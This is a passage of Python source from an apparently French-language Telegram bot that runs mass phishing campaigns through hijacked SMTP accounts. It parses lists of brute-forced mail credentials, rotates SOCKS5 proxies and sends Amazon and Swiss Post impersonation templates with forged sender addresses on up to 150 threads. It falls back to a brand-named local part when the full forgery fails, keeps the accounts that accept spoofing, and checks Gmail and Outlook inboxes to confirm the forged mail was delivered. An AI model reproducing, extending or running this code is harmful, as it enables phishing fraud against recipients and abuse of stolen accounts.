    # --- CAMPAIGN LIST ---
    if data == "camp_list":
        mgr = CampaignManager(DB_PATH)
        campaigns = mgr.get_campaigns(10)
        mgr.close()
        
        if not campaigns:
            return await query.edit_message_text(
                "Aucune campagne.", reply_markup=_kb_main()
            )
        
        lines = ["MES CAMPAGNES\n"]
        buttons = []
        for c in campaigns:
            status = c["status"].upper()
            lines.append(
                f"#{c['id']} {c['name']}\n"
                f"  [{status}] {c['sent_count']}/{c['total_recipients']} | Failed: {c['failed_count']}"
            )
            buttons.append([InlineKeyboardButton(
                f"#{c['id']} {c['name'][:20]} [{status}]",
                callback_data=f"camp_view_{c['id']}"
            )])
        
        buttons.append([InlineKeyboardButton("Retour", callback_data="back_main")])
        return await query.edit_message_text(
            "\n".join(lines)[:4000],
            reply_markup=InlineKeyboardMarkup(buttons),
        )

    if data.startswith("camp_view_"):
        camp_id = int(data.split("_")[-1])
        mgr = CampaignManager(DB_PATH)
        stats = mgr.get_stats(camp_id)
        camp = mgr.get_campaign(camp_id)
        mgr.close()
        
        if not camp:
            return await query.edit_message_text("Campagne introuvable.", reply_markup=_kb_main())
        
        text = (
            f"CAMPAGNE #{camp_id}\n\n"
            f"Nom: {camp['name']}\n"
            f"Sujet: {camp['subject']}\n"
            f"From: {camp['from_name']} <{camp['from_email']}>\n"
            f"Reply-To: {camp.get('reply_to', 'aucun')}\n"
            f"Status: {stats.status.upper()}\n\n"
            f"Sent: {stats.sent}/{stats.total}\n"
            f"Failed: {stats.failed}\n"
            f"Pending: {stats.pending}\n"
            f"SMTP: {stats.smtp_count}\n"
            f"Rate: {stats.rate_per_minute}/min"
        )
        
        buttons = []
        if stats.status in ("draft", "stopped"):
            buttons.append([InlineKeyboardButton("LANCER", callback_data=f"camp_start_{camp_id}")])
        if stats.status == "running":
            buttons.append([InlineKeyboardButton("STOP", callback_data=f"camp_stop_{camp_id}")])
        buttons.append([
            InlineKeyboardButton("SUPPRIMER", callback_data=f"camp_del_{camp_id}"),
            InlineKeyboardButton("Retour", callback_data="camp_list"),
        ])
        
        return await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(buttons))

    if data.startswith("camp_start_"):
        camp_id = int(data.split("_")[-1])
        mgr = CampaignManager(DB_PATH)
        smtp_added = mgr.add_all_valid_smtp(camp_id)
        stats = mgr.get_stats(camp_id)
        mgr.close()
        
        if stats.smtp_count == 0:
            return await query.edit_message_text(
                "Aucun SMTP AUTH OK.", reply_markup=_kb_main()
            )
        if stats.pending == 0:
            return await query.edit_message_text(
                "Aucun destinataire.", reply_markup=_kb_main()
            )
        
        await query.edit_message_text(
            f"CAMPAGNE #{camp_id} LANCEE\n"
            f"SMTP: {stats.smtp_count} | Pending: {stats.pending}",
            reply_markup=_kb_main(),
        )
        asyncio.create_task(run_campaign(camp_id, DB_PATH, chat_id))

    if data.startswith("camp_stop_"):
        camp_id = int(data.split("_")[-1])
        stop_campaign(camp_id)
        return await query.edit_message_text(
            f"CAMPAGNE #{camp_id} ARRETEE", reply_markup=_kb_main()
        )

    if data.startswith("camp_del_"):
        camp_id = int(data.split("_")[-1])
        mgr = CampaignManager(DB_PATH)
        mgr.delete_campaign(camp_id)
        mgr.close()
        return await query.edit_message_text(
            f"CAMPAGNE #{camp_id} SUPPRIMEE", reply_markup=_kb_main()
        )

    # --- STATS ---
    if data == "stats":
        smtp_list = _get_all_smtp()
        mgr = CampaignManager(DB_PATH)
        campaigns = mgr.get_campaigns(100)
        mgr.close()
        
        from .proxy_pool import ProxyPool
        pool = ProxyPool(DB_PATH)
        proxy_stats = pool.stats()
        pool.close()
        
        total_sent = sum(c["sent_count"] for c in campaigns)
        total_failed = sum(c["failed_count"] for c in campaigns)
        
        by_prov: dict[str, int] = {}
        for s in smtp_list:
            prov = (s.get("provider") or "?").upper()
            by_prov[prov] = by_prov.get(prov, 0) + 1
        
        lines = [
            "=============================",
            "  SENDER STATS",
            "=============================",
            "",
            f"SMTP AUTH OK: {len(smtp_list)}",
        ]
        for prov, count in sorted(by_prov.items(), key=lambda x: -x[1]):
            lines.append(f"  {prov}: {count}")
        lines.extend([
            "",
            f"Proxies: {proxy_stats['active']} actifs / {proxy_stats['total']} total",
            "",
            f"Campagnes: {len(campaigns)}",
            f"Mails envoyes: {total_sent}",
            f"Echecs: {total_failed}",
        ])
        
        return await query.edit_message_text(
            "\n".join(lines), reply_markup=_kb_main()
        )

    # --- PROXY LIST ---
    if data == "proxy_list":
        from .proxy_pool import ProxyPool
        pool = ProxyPool(DB_PATH)
        proxies = pool.get_all()
        stats = pool.stats()
        pool.close()

        if not proxies:
            return await query.edit_message_text(
                "PROXIES\n\n"
                "Aucun proxy configure.\n\n"
                "Ajoute des proxies SOCKS5 pour router\n"
                "les connexions SMTP a travers eux.\n\n"
                "Les proxies sont utilises en rotation\n"
                "dans les campagnes et spoof tests.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("ADD PROXY", callback_data="add_proxy")],
                    [InlineKeyboardButton("Retour", callback_data="back_main")],
                ]),
            )

        lines = [
            "=============================",
            "  MES PROXIES",
            "=============================",
            "",
            f"Total: {stats['total']} | Actifs: {stats['active']} | Inactifs: {stats['inactive']}",
            "",
        ]
        buttons = []
        for p in proxies:
            status = "ON" if p["is_active"] else "OFF"
            label = p.get("label") or p["host"]
            ok = p.get("success_count", 0)
            fail = p.get("fail_count", 0)
            lines.append(f"#{p['id']} [{status}] {label}")
            lines.append(f"  {p['host']}:{p['port']} | OK:{ok} FAIL:{fail}")
            if p.get("last_error"):
                lines.append(f"  Err: {p['last_error'][:40]}")
            buttons.append([
                InlineKeyboardButton(f"#{p['id']} {label[:15]}", callback_data=f"proxy_view_{p['id']}"),
            ])

        buttons.append([InlineKeyboardButton("ADD PROXY", callback_data="add_proxy")])
        buttons.append([InlineKeyboardButton("Retour", callback_data="back_main")])

        return await query.edit_message_text(
            "\n".join(lines)[:4000],
            reply_markup=InlineKeyboardMarkup(buttons),
        )

    # --- PROXY VIEW ---
    if data.startswith("proxy_view_"):
        proxy_id = int(data.split("_")[-1])
        from .proxy_pool import ProxyPool
        pool = ProxyPool(DB_PATH)
        p = pool.get_by_id(proxy_id)
        pool.close()

        if not p:
            return await query.edit_message_text("Proxy introuvable.", reply_markup=_kb_main())

        status = "ACTIF" if p["is_active"] else "INACTIF"
        text = (
            f"PROXY #{p['id']}\n\n"
            f"Label: {p.get('label') or '—'}\n"
            f"Type: {p['proxy_type']}\n"
            f"Host: {p['host']}:{p['port']}\n"
            f"Auth: {'oui' if p.get('username') else 'non'}\n"
            f"Status: {status}\n\n"
            f"Succes: {p.get('success_count', 0)}\n"
            f"Echecs: {p.get('fail_count', 0)}\n"
            f"Derniere erreur: {p.get('last_error') or 'aucune'}\n"
        )

        toggle_text = "DESACTIVER" if p["is_active"] else "ACTIVER"
        toggle_data = f"proxy_off_{proxy_id}" if p["is_active"] else f"proxy_on_{proxy_id}"

        return await query.edit_message_text(
            text,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(toggle_text, callback_data=toggle_data)],
                [InlineKeyboardButton("SUPPRIMER", callback_data=f"proxy_del_{proxy_id}")],
                [InlineKeyboardButton("Retour", callback_data="proxy_list")],
            ]),
        )

    # --- PROXY ACTIVATE ---
    if data.startswith("proxy_on_"):
        proxy_id = int(data.split("_")[-1])
        from .proxy_pool import ProxyPool
        pool = ProxyPool(DB_PATH)
        pool.activate(proxy_id)
        pool.close()
        return await query.edit_message_text(
            f"Proxy #{proxy_id} ACTIVE", reply_markup=_kb_main()
        )

    # --- PROXY DEACTIVATE ---
    if data.startswith("proxy_off_"):
        proxy_id = int(data.split("_")[-1])
        from .proxy_pool import ProxyPool
        pool = ProxyPool(DB_PATH)
        pool.deactivate(proxy_id)
        pool.close()
        return await query.edit_message_text(
            f"Proxy #{proxy_id} DESACTIVE", reply_markup=_kb_main()
        )

    # --- PROXY DELETE ---
    if data.startswith("proxy_del_"):
        proxy_id = int(data.split("_")[-1])
        from .proxy_pool import ProxyPool
        pool = ProxyPool(DB_PATH)
        pool.remove_proxy(proxy_id)
        pool.close()
        return await query.edit_message_text(
            f"Proxy #{proxy_id} SUPPRIME", reply_markup=_kb_main()
        )

    # --- ADD PROXY ---
    if data == "add_proxy":
        ctx.user_data["waiting"] = "add_proxy_lines"
        return await query.edit_message_text(
            "ADD PROXY\n\n"
            "Formats acceptes:\n"
            "socks5://user:pass@host:port\n"
            "socks5://host:port\n"
            "host:port|user:pass\n"
            "host:port\n\n"
            "Tu peux coller PLUSIEURS lignes.\n"
            "Ajoute un label apres | optionnel:\n"
            "socks5://host:port LABEL\n\n"
            "/cancel pour annuler"
        )


# ---------------------------------------------------------------------------
# Mass Spoof Test — test a list of SMTP with real spoofed sends
# ---------------------------------------------------------------------------
async def _run_mass_test(update: Update, ctx: ContextTypes.DEFAULT_TYPE, raw_text: str):
    """Wrapper: parse, validate, then launch background task."""
    from .spoof_templates import get_template

    to_email = ctx.user_data.get("mass_test_to", "")
    tpl_key = ctx.user_data.get("mass_tpl", "amazon")
    tpl = get_template(tpl_key) or get_template("amazon")
    ctx.user_data.pop("waiting", None)
    ctx.user_data.pop("mass_test_to", None)
    ctx.user_data.pop("mass_tpl", None)

    if not to_email:
        return await update.effective_message.reply_text("Pas de destinataire.", reply_markup=_kb_main())

    lines = raw_text.strip().splitlines()
    smtp_list = []
    for line in lines:
        parsed = _parse_smtp_line(line)
        if parsed:
            smtp_list.append(parsed)

    if not smtp_list:
        return await update.effective_message.reply_text(
            "Aucun SMTP valide dans le fichier.\n"
            "Format: host:port|user:password|LABEL",
            reply_markup=_kb_main(),
        )

    total = len(smtp_list)
    max_workers = min(150, total)
    chat_id = update.effective_message.chat_id

    await update.effective_message.reply_text(
        f"MASS SPOOF TEST — BACKGROUND\n\n"
        f"Template: {tpl['brand']}\n"
        f"From: {tpl['from_name']} <{tpl['from_email']}>\n"
        f"To: {to_email}\n"
        f"SMTP: {total} | Workers: {max_workers}\n\n"
        f"LANCE EN BACKGROUND — tu peux utiliser\n"
        f"le bot normalement. Resultats a la fin.",
        reply_markup=_kb_main(),
    )

    bot = update.get_bot()
    asyncio.create_task(
        _bg_mass_test(bot, chat_id, smtp_list, tpl, to_email, max_workers)
    )


async def _bg_mass_test(bot, chat_id: int, smtp_list: list, tpl: dict, to_email: str, max_workers: int):
    """Background mass spoof test — does NOT block the bot."""
    from concurrent.futures import ThreadPoolExecutor
    import threading

    total = len(smtp_list)

    async def _send(text):
        try:
            await bot.send_message(chat_id=chat_id, text=text[:4000])
        except Exception:
            pass

    # Thread-safe counters
    lock = threading.Lock()
    stats = {
        "done": 0,
        "spoof_ok": [],
        "strip_ok": [],
        "auth_fail": 0,
        "reject": 0,
        "error": 0,
        "error_types": {},
        "reject_types": {},
        "provider_tested": {},
        "last_errors": [],
    }
    start_time = time.time()

    def _test_one(idx: int, s: dict) -> dict:
        """Test a single SMTP with send_clean (TLD strip auto)."""
        from .campaign_sender import send_clean

        smtp_config = {
            "host": s["host"], "port": s["port"],
            "username": s["user"], "password": s["password"],
            "from_email": s["user"],
        }

        # Detect provider type
        h = s["host"].lower()
        prov = h.replace("smtp.", "").replace("mail.", "").split(".")[0]
        for p, kw in [("hostinger","hostinger"),("singnet","singnet"),("brevo","brevo"),
                       ("sendgrid","sendgrid"),("gmail","gmail"),("ovh","ovh")]:
            if kw in h:
                prov = p
                break

        try:
            # Try spoof (send_clean auto-strips TLD)
            result = send_clean(
                smtp_config, tpl["from_name"], tpl["from_email"],
                to_email, tpl["subject"], tpl["html"],
                tpl.get("reply_to", ""), None,
            )
            if result["success"]:
                result["mode"] = "spoof"
            else:
                # Fallback basique: swisspost@domain_of_smtp
                domain = s["user"].split("@")[1] if "@" in s["user"] else s["host"]
                bas_from = "swisspost@" + domain
                result2 = send_clean(
                    smtp_config, tpl["from_name"], bas_from,
                    to_email, tpl["subject"], tpl["html"],
                    tpl.get("reply_to", ""), None,
                )
                if result2["success"]:
                    result = result2
                    result["mode"] = "strip"
                else:
                    result["mode"] = "failed"
            result["provider_type"] = prov
        except Exception as e:
            result = {"success": False, "mode": "failed", "error": f"{type(e).__name__}", "provider_type": prov}

        prov = result.get("provider_type", "unknown")
        err = result.get("error", "")

        with lock:
            stats["done"] += 1
            stats["provider_tested"][prov] = stats["provider_tested"].get(prov, 0) + 1

            if result["success"] and result["mode"] == "spoof":
                stats["spoof_ok"].append((s, result))
            elif result["success"] and result["mode"] == "strip":
                stats["strip_ok"].append((s, result))
            elif "AUTH" in err:
                stats["auth_fail"] += 1
                err_key = err.split("/")[0].strip() if "/" in err else err
                stats["error_types"][err_key] = stats["error_types"].get(err_key, 0) + 1
            elif err:
                if "DATA" in err or "SENDER" in err:
                    stats["reject"] += 1
                    rej_key = err.split("/")[0].strip() if "/" in err else err
                    stats["reject_types"][rej_key] = stats["reject_types"].get(rej_key, 0) + 1
                else:
                    stats["error"] += 1
                    err_key = err.split(":")[0].strip() if ":" in err else err
                    stats["error_types"][err_key] = stats["error_types"].get(err_key, 0) + 1
            else:
                stats["error"] += 1

            # Keep last 5 errors
            if err:
                stats["last_errors"].append(f"{s['host'][:20]}: {err[:30]}")
                if len(stats["last_errors"]) > 5:
                    stats["last_errors"] = stats["last_errors"][-5:]

        return result

    # Run all tests in thread pool
    loop = asyncio.get_event_loop()
    executor = ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="spoof")

    # Submit all tasks
    futures = {executor.submit(_test_one, i, s): i for i, s in enumerate(smtp_list)}

    # Progress reporter — send updates every 5 seconds
    last_progress = 0
    last_progress_time = time.time()

    while True:
        await asyncio.sleep(2)  # Check every 2s

        with lock:
            done = stats["done"]

        if done == total:
            break

        # Send progress every 50 SMTP or every 5 seconds
        now = time.time()
        if (done - last_progress >= 50 or now - last_progress_time >= 5) and done > last_progress:
            last_progress = done
            last_progress_time = now

            with lock:
                elapsed_sec = now - start_time
                rate = done / elapsed_sec if elapsed_sec > 0 else 0
                eta_sec = int((total - done) / rate) if rate > 0 else 0
                eta_min = eta_sec // 60
                eta_h = eta_min // 60
                eta_str = f"{eta_h}h{eta_min % 60:02d}m" if eta_h > 0 else f"{eta_min}m{eta_sec % 60:02d}s"

                # Error breakdown
                all_err = {**stats["error_types"], **stats["reject_types"]}
                err_parts = [f"{k}: {v}" for k, v in sorted(all_err.items(), key=lambda x: -x[1])[:4]]
                err_line = " | ".join(err_parts) if err_parts else "aucune"

                # Provider stats
                top_provs = sorted(stats["provider_tested"].items(), key=lambda x: -x[1])[:3]
                prov_line = ", ".join(f"{p} ({c})" for p, c in top_provs)

                spoof_n = len(stats["spoof_ok"])
                strip_n = len(stats["strip_ok"])

            pct = (done / total) * 100
            progress_msg = (
                f"PROGRESS: {done}/{total} ({pct:.1f}%) — {rate:.1f}/s — ETA ~{eta_str}\n"
                f"SPOOF OK: {spoof_n} | STRIP OK: {strip_n}\n"
                f"AUTH FAIL: {stats['auth_fail']} | REJECT: {stats['reject']} | ERROR: {stats['error']}\n"
                f"\nErreurs: {err_line}\n"
                f"Providers: {prov_line}"
            )

            try:
                await _send(progress_msg)
            except Exception:
                pass

    # Wait for all futures to complete
    executor.shutdown(wait=True)

    elapsed_total = time.time() - start_time
    rate_final = total / elapsed_total if elapsed_total > 0 else 0

    # Final report
    with lock:
        spoof_ok = stats["spoof_ok"]
        strip_ok = stats["strip_ok"]

    report = [
        "=" * 35,
        "  MASS SPOOF TEST — RESULTAT",
        "=" * 35,
        "",
        f"Template: {tpl['brand']}",
        f"To: {to_email}",
        f"Total teste: {total}",
        f"Temps: {elapsed_total:.0f}s ({rate_final:.1f}/s)",
        f"Workers: {max_workers}",
        "",
        f"SPOOF OK (From complet):  {len(spoof_ok)}",
        f"STRIP OK (sans TLD):      {len(strip_ok)}",
        f"AUTH FAIL (creds mortes):  {stats['auth_fail']}",
        f"REJECT (serveur strict):   {stats['reject']}",
        f"ERROR (timeout/autre):     {stats['error']}",
    ]

    # Error type breakdown
    all_err_types = {**stats["error_types"], **stats["reject_types"]}
    if all_err_types:
        report.append("\nDETAIL ERREURS:")
        for etype, cnt in sorted(all_err_types.items(), key=lambda x: -x[1]):
            pct = (cnt / total) * 100
            report.append(f"  {etype}: {cnt} ({pct:.1f}%)")

    # Provider breakdown
    if stats["provider_tested"]:
        report.append("\nPROVIDERS TESTES:")
        for prov, cnt in sorted(stats["provider_tested"].items(), key=lambda x: -x[1])[:10]:
            report.append(f"  {prov}: {cnt}")

    if spoof_ok:
        report.append("\nSPOOF OK:")
        for s, r in spoof_ok:
            report.append(f"  {s['host']}:{s['port']}|{s['user']}  [{r['provider_type']}]")
            _add_manual_smtp({**s, "label": f"SPOOF_SPAM_{s['label']}"})

    if strip_ok:
        report.append("\nSTRIP OK (sans TLD):")
        for s, r in strip_ok:
            report.append(f"  {s['host']}:{s['port']}|{s['user']}  [{r['provider_type']}]")
            _add_manual_smtp({**s, "label": f"STRIP_{s['label']}"})

    if spoof_ok or strip_ok:
        good = len(spoof_ok) + len(strip_ok)
        report.append(f"\n{good} SMTP ajoutes automatiquement a MES SMTP!")

    # Provider spoof stats
    prov_stats: dict[str, dict] = {}
    for lst, mode in [(spoof_ok, "spoof"), (strip_ok, "strip")]:
        for _, r in lst:
            prov = r["provider_type"]
            if prov not in prov_stats:
                prov_stats[prov] = {"spoof": 0, "strip": 0}
            prov_stats[prov][mode] += 1
    if prov_stats:
        report.append("\nPROVIDERS QUI ACCEPTENT LE SPOOF:")
        for prov, counts in sorted(prov_stats.items(), key=lambda x: -(x[1]["spoof"] + x[1]["strip"])):
            report.append(f"  {prov}: spoof={counts['spoof']} strip={counts['strip']}")

    if not spoof_ok and not strip_ok:
        report.append("\nAUCUN SMTP SPOOFABLE")
        report.append("Les creds de bruter sont sur des providers stricts.")
        report.append("Pour du spoof, il faut des Postfix/self-hosted.")

    final = "\n".join(report)
    if len(final) > 4000:
        final = final[:4000] + "\n..."

    await _send(final)


# ---------------------------------------------------------------------------
# Mass IMAP Check — DUAL MODE: SPOOF + BASIQUE
# ---------------------------------------------------------------------------
def _build_basique_from(smtp_user: str, brand_name: str) -> str:
    """Build basique From: brand@domaineduvraismtp.com
    Ex: smtp_user=user@hostinger.mx, brand=swisspost → swisspost@hostinger.mx
    """
    if "@" in smtp_user:
        domain = smtp_user.split("@", 1)[1]
    else:
        domain = smtp_user
    safe_brand = brand_name.lower().replace(" ", "").replace("-", "")
    return f"{safe_brand}@{domain}"


def _send_basique_to_checker(
    smtp_host: str, smtp_port: int, smtp_user: str, smtp_password: str,
    checker_email: str, from_name: str, basique_from: str,
    subject: str, html_body: str, marker: str, reply_to: str = "",
    timeout: float = 10.0,
) -> tuple[bool, str]:
    """Send with basique From (brand@realdomain) — no full spoof, just local part change.
    Returns (success, error).
    """
    import smtplib
    import ssl
    import uuid as _uuid
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import re as _re

    tracked_subject = f"{subject} [{marker}]"

    msg = MIMEMultipart("alternative")
    msg["Subject"] = tracked_subject
    msg["To"] = checker_email
    msg["From"] = f"{from_name} <{basique_from}>"
    if reply_to:
        msg["Reply-To"] = reply_to
    msg["Message-ID"] = f"<bq-{marker}@basique>"
    msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S %z")
    msg["X-Mailer"] = "Microsoft Outlook 16.0"
    msg["MIME-Version"] = "1.0"
    text = _re.sub(r'<[^>]+>', '', html_body)[:500]
    msg.attach(MIMEText(text, "plain", "utf-8"))
    msg.attach(MIMEText(html_body, "html", "utf-8"))
    raw = msg.as_string()

    try:
        if smtp_port == 465:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            server = smtplib.SMTP_SSL(smtp_host, smtp_port, timeout=timeout, context=ctx)
        else:
            server = smtplib.SMTP(smtp_host, smtp_port, timeout=timeout)
            server.ehlo()
            try:
                server.starttls(context=ssl.create_default_context())
                server.ehlo()
            except Exception:
                pass
        server.login(smtp_user, smtp_password)
        server.sendmail(smtp_user, [checker_email], raw)
        server.quit()
        return True, ""
    except smtplib.SMTPDataError as e:
        return False, f"DATA_{e.smtp_code}"
    except smtplib.SMTPAuthenticationError:
        return False, "AUTH"
    except smtplib.SMTPSenderRefused as e:
        return False, f"SENDER_{e.smtp_code}"
    except Exception as e:
        return False, f"{type(e).__name__}"


async def _run_mass_imap_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE, raw_text: str):
    """Wrapper: parse, validate, then launch background task."""
    from .imap_checker import (
        GMAIL_CHECKER,
        get_gmail_checker_email, is_gmail_checker_configured,
    )
    from .spoof_templates import get_template

    tpl_key = ctx.user_data.get("mimap_tpl", "swisspost")
    tpl = get_template(tpl_key) or get_template("swisspost")
    ctx.user_data.pop("waiting", None)
    ctx.user_data.pop("mimap_tpl", None)

    checker_email = get_gmail_checker_email()
    if not checker_email:
        return await update.effective_message.reply_text(
            "Gmail checker non configure.", reply_markup=_kb_main(),
        )

    # Parse SMTP lines
    lines = raw_text.strip().splitlines()
    smtp_list = []
    for line in lines:
        parsed = _parse_smtp_line(line)
        if parsed:
            smtp_list.append(parsed)

    if not smtp_list:
        return await update.effective_message.reply_text(
            "Aucun SMTP valide.\nFormat: host:port|user:password|LABEL",
            reply_markup=_kb_main(),
        )

    total = len(smtp_list)
    max_workers = min(150, total)
    brand_name = tpl.get("from_name", "swisspost").lower().replace(" ", "")
    chat_id = update.effective_message.chat_id

    await update.effective_message.reply_text(
        f"MASS IMAP CHECK — BACKGROUND\n\n"
        f"Template: {tpl['brand']}\n"
        f"SPOOF: {tpl['from_name']} <{tpl['from_email']}>\n"
        f"BASIQUE: {tpl['from_name']} <{brand_name}@domaine_smtp>\n"
        f"Checker: {checker_email}\n"
        f"SMTP: {total} | Workers: {max_workers}\n\n"
        f"LANCE EN BACKGROUND — tu peux utiliser\n"
        f"le bot normalement (campagnes, etc.)\n"
        f"Les resultats arrivent quand c'est fini.",
        reply_markup=_kb_main(),
    )

    # Launch background task
    bot = update.get_bot()
    asyncio.create_task(
        _bg_mass_imap_check(bot, chat_id, smtp_list, tpl, checker_email, brand_name, max_workers)
    )


async def _bg_mass_imap_check(
    bot, chat_id: int, smtp_list: list, tpl: dict,
    checker_email: str, brand_name: str, max_workers: int,
):
    """
    Background DUAL MODE mass check — Gmail + Outlook.
    Each SMTP is tested against BOTH checkers.
    Classification: SPOOF_INBOX_GMAIL, SPOOF_INBOX_OUTLOOK, SPOOF_INBOX_BOTH etc.
    """
    from .imap_checker import (
        GMAIL_CHECKER, is_gmail_checker_configured,
        is_outlook_checker_configured, get_outlook_checker_email,
        batch_outlook_imap,
    )
    from concurrent.futures import ThreadPoolExecutor
    import threading
    import uuid as _uuid

    has_outlook = is_outlook_checker_configured()
    outlook_email = get_outlook_checker_email() if has_outlook else ""

    total = len(smtp_list)
    lock = threading.Lock()
    stats = {
        "spoof_sent_gmail": 0, "spoof_sent_outlook": 0,
        "basique_sent_gmail": 0, "basique_sent_outlook": 0,
        "auth_fail": 0,
        "spoof_fail": 0, "basique_fail": 0,
        # markers: {marker: smtp_dict}
        "markers_spoof_gmail": {}, "markers_spoof_outlook": {},
        "markers_basique_gmail": {}, "markers_basique_outlook": {},
    }
    start_time = time.time()

    def _test_one_dual(idx: int, s: dict):
        """Send SPOOF + BASIQUE to Gmail AND Outlook for one SMTP."""
        from .campaign_sender import send_clean

        smtp_config = {
            "host": s["host"], "port": s["port"],
            "username": s["user"], "password": s["password"],
            "from_email": s["user"],
        }

        auth_dead = False

        # === GMAIL: SPOOF + BASIQUE ===
        marker_sg = f"SG-{_uuid.uuid4().hex[:8]}"
        tracked_sg = f"{tpl['subject']} [{marker_sg}]"
        try:
            r_sg = send_clean(smtp_config, tpl["from_name"], tpl["from_email"],
                              checker_email, tracked_sg, tpl["html"], tpl.get("reply_to", ""), None)
            ok_sg = r_sg["success"]
            err_sg = r_sg.get("error", "")
        except Exception as e:
            ok_sg, err_sg = False, str(e)[:40]

        if "AUTH" in (err_sg or ""):
            with lock:
                stats["auth_fail"] += 1
            return

        marker_bg = f"BG-{_uuid.uuid4().hex[:8]}"
        basique_from = _build_basique_from(s["user"], brand_name)
        tracked_bg = f"{tpl['subject']} [{marker_bg}]"
        try:
            r_bg = send_clean(smtp_config, tpl["from_name"], basique_from,
                              checker_email, tracked_bg, tpl["html"], tpl.get("reply_to", ""), None)
            ok_bg = r_bg["success"]
        except Exception:
            ok_bg = False

        # === OUTLOOK: SPOOF + BASIQUE ===
        ok_so = ok_bo = False
        marker_so = marker_bo = ""
        if has_outlook and outlook_email:
            marker_so = f"SO-{_uuid.uuid4().hex[:8]}"
            tracked_so = f"{tpl['subject']} [{marker_so}]"
            try:
                r_so = send_clean(smtp_config, tpl["from_name"], tpl["from_email"],
                                  outlook_email, tracked_so, tpl["html"], tpl.get("reply_to", ""), None)
                ok_so = r_so["success"]
            except Exception:
                ok_so = False

            marker_bo = f"BO-{_uuid.uuid4().hex[:8]}"
            tracked_bo = f"{tpl['subject']} [{marker_bo}]"
            try:
                r_bo = send_clean(smtp_config, tpl["from_name"], basique_from,
                                  outlook_email, tracked_bo, tpl["html"], tpl.get("reply_to", ""), None)
                ok_bo = r_bo["success"]
            except Exception:
                ok_bo = False

        with lock:
            if ok_sg:
                stats["spoof_sent_gmail"] += 1
                stats["markers_spoof_gmail"][marker_sg] = s
            else:
                stats["spoof_fail"] += 1
            if ok_bg:
                stats["basique_sent_gmail"] += 1
                stats["markers_basique_gmail"][marker_bg] = s
            else:
                stats["basique_fail"] += 1
            if ok_so:
                stats["spoof_sent_outlook"] += 1
                stats["markers_spoof_outlook"][marker_so] = s
            if ok_bo:
                stats["basique_sent_outlook"] += 1
                stats["markers_basique_outlook"][marker_bo] = s

            done_now = stats["spoof_sent_gmail"] + stats["spoof_fail"] + stats["auth_fail"]
            if done_now % 25 == 0:
                print(f"[MASS IMAP] {done_now}/{total} — gmail_spoof:{stats['spoof_sent_gmail']} outlook_spoof:{stats['spoof_sent_outlook']} auth_fail:{stats['auth_fail']}", flush=True)

    async def _send(text):
        try:
            await bot.send_message(chat_id=chat_id, text=text[:4000])
        except Exception:
            pass

    # === PHASE 1: Send to both checkers ===
    executor = ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="dual")
    futures = [executor.submit(_test_one_dual, i, s) for i, s in enumerate(smtp_list)]

    last_progress = 0
    while True:
        await asyncio.sleep(2)
        with lock:
            done_approx = stats["spoof_sent_gmail"] + stats["spoof_fail"] + stats["auth_fail"]
        if done_approx >= total:
            break
        if done_approx - last_progress >= 10:
            last_progress = done_approx
            elapsed = time.time() - start_time
            rate = done_approx / elapsed if elapsed > 0 else 0
            eta = int((total - done_approx) / rate) if rate > 0 else 0
            outlook_info = f" | OTL spoof:{stats['spoof_sent_outlook']}" if has_outlook else ""
            await _send(
                f"IMAP CHECK: {done_approx}/{total} ({rate:.1f}/s) ETA ~{eta}s\n"
                f"GMAIL spoof:{stats['spoof_sent_gmail']} bas:{stats['basique_sent_gmail']}{outlook_info}\n"
                f"AUTH FAIL: {stats['auth_fail']}"
            )

    executor.shutdown(wait=True)
    phase1_time = time.time() - start_time

    total_gmail = len(stats["markers_spoof_gmail"]) + len(stats["markers_basique_gmail"])
    total_outlook = len(stats["markers_spoof_outlook"]) + len(stats["markers_basique_outlook"])
    total_markers = total_gmail + total_outlook

    await _send(
        f"PHASE 1 TERMINEE — {phase1_time:.0f}s\n\n"
        f"GMAIL: spoof={stats['spoof_sent_gmail']} basique={stats['basique_sent_gmail']}\n"
        f"OUTLOOK: spoof={stats['spoof_sent_outlook']} basique={stats['basique_sent_outlook']}\n"
        f"Auth fail: {stats['auth_fail']}\n\n"
        f"PHASE 2: Attente 90s pour delivery..."
    )

    if total_markers == 0:
        await _send("Aucun mail envoye — rien a checker.")
        return

    await asyncio.sleep(90)

    # === PHASE 3: Check BOTH IMAPs ===
    await _send(f"PHASE 3: Check IMAP (Gmail:{total_gmail} Outlook:{total_outlook})...")

    # --- Gmail batch check ---
    gmail_markers = list(stats["markers_spoof_gmail"].keys()) + list(stats["markers_basique_gmail"].keys())

    def _batch_gmail(markers_to_check):
        """Bulk Gmail IMAP check — fetch recent subjects, match markers locally.
        Avoids per-marker SUBJECT search which gets throttled at 60+ markers."""
        import imaplib, ssl as _ssl, email as _email
        results = {}
        marker_set = set(markers_to_check)
        if not marker_set:
            return results
        try:
            ctx_ssl = _ssl.create_default_context()
            ctx_ssl.check_hostname = False
            ctx_ssl.verify_mode = _ssl.CERT_NONE
            imap = imaplib.IMAP4_SSL(GMAIL_CHECKER["imap_host"], GMAIL_CHECKER["imap_port"],
                                      ssl_context=ctx_ssl, timeout=60)
            imap.login(GMAIL_CHECKER["email"], GMAIL_CHECKER["password"])

            def _scan_folder(folder_name, label):
                """Fetch recent subjects from folder and match markers."""
                found = {}
                try:
                    st, data = imap.select(folder_name, readonly=True)
                    if st != "OK":
                        return found
                    msg_count = int(data[0]) if data[0] else 0
                    if msg_count == 0:
                        return found
                    # Fetch last N messages (enough to cover our batch)
                    fetch_count = min(msg_count, max(len(marker_set) * 3, 500))
                    start_id = max(1, msg_count - fetch_count + 1)
                    fetch_range = f"{start_id}:{msg_count}"
                    st2, msg_data = imap.fetch(fetch_range, "(BODY.PEEK[HEADER.FIELDS (SUBJECT)])")
                    if st2 != "OK":
                        return found
                    for item in msg_data:
                        if isinstance(item, tuple) and len(item) >= 2:
                            raw_header = item[1]
                            if isinstance(raw_header, bytes):
                                raw_header = raw_header.decode("utf-8", errors="replace")
                            subj_line = raw_header.replace("\r\n", " ").replace("\n", " ")
                            # Check each unfound marker
                            for m in list(marker_set - set(found.keys())):
                                if m in subj_line:
